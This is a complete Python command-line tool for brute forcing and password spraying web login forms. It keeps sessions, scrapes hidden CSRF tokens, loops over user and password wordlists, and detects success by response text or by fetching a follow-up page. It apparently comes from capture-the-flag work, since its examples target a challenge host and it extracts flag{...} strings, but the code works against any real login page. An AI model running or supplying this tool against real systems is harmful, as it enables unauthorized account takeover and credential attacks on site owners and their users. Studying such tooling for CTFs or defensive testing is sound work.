#!/usr/bin/env python3
"""Form login brute force / password spraying with session + CSRF support.

Success is detected by --success-text on the login response OR by fetching
--success-url afterwards (e.g. /dashboard) and looking for --success-text there
(default: anything that is not a redirect back to login and contains no
--fail-text).

    python login_brute.py http://auth13.chal.deti:8072/login -u vpnuser -P top-1000.txt \
        --success-url http://auth13.chal.deti:8072/dashboard --success-text 'flag{'
    python login_brute.py http://t/login -U users.txt -p 'Welcome1' --fail-text 'Invalid'   # spray
    python login_brute.py http://t/login -u admin -P list.txt --csrf-field csrf_token --fail-text 'wrong'
"""
import argparse
import re
import sys

import requests

FLAG = re.compile(r"flag\{[^}]+\}")


def lines(path):
    return [l.rstrip("\r\n") for l in open(path, encoding="utf-8", errors="ignore") if l.strip()]


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("url")
    ap.add_argument("-u", "--user")
    ap.add_argument("-U", "--users")
    ap.add_argument("-p", "--password")
    ap.add_argument("-P", "--passwords")
    ap.add_argument("--user-field", default="username")
    ap.add_argument("--pass-field", default="password")
    ap.add_argument("--extra", default="", help="extra form fields a=1&b=2")
    ap.add_argument("--csrf-field", help="name of hidden CSRF input to scrape from the login page")
    ap.add_argument("--fail-text", help="text present on failure")
    ap.add_argument("--success-text", help="text present on success")
    ap.add_argument("--success-url", help="page to fetch after login to verify")
    a = ap.parse_args()
    users = [a.user] if a.user else lines(a.users)
    pwds = [a.password] if a.password is not None else lines(a.passwords)
    extra = dict(x.split("=", 1) for x in a.extra.split("&") if "=" in x)

    for u in users:
        for p in pwds:
            s = requests.Session()
            data = {a.user_field: u, a.pass_field: p, **extra}
            if a.csrf_field:
                page = s.get(a.url, timeout=10).text
                m = re.search(r'name=["\']%s["\'][^>]*value=["\']([^"\']+)' % re.escape(a.csrf_field), page) or \
                    re.search(r'value=["\']([^"\']+)["\'][^>]*name=["\']%s["\']' % re.escape(a.csrf_field), page)
                if m:
                    data[a.csrf_field] = m.group(1)
            r = s.post(a.url, data=data, timeout=10)
            body = r.text
            if a.success_url:
                body = s.get(a.success_url, timeout=10).text
            ok = True
            if a.fail_text and a.fail_text in r.text:
                ok = False
            if a.success_text and a.success_text not in body:
                ok = False
            if not a.fail_text and not a.success_text and r.url.rstrip("/").endswith("login"):
                ok = False
            if ok:
                print(f"[+] {u}:{p}")
                for f in FLAG.findall(body):
                    print(f"[FLAG] {f}")
                return 0
    print("[-] no valid credentials found")
    return 1


if __name__ == "__main__":
    sys.exit(main())
